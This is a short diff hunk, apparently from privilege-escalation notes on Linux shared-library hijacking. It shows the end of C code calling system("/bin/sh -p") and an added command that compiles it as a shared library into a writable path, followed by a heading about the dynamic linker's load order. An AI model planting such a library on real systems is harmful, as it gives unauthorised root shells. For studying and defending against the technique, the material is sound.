@@ -41,6 +41,7 @@ Check if the path is writable:
                       system("/bin/sh -p");
                   } 
 -----------------------------------------------------------------------------
+complile it: gcc src.c -fPIC -shared -o /development/libshared.so
 
 🔁 Flowchart: Dynamic Linker’s Library Loading Order
 
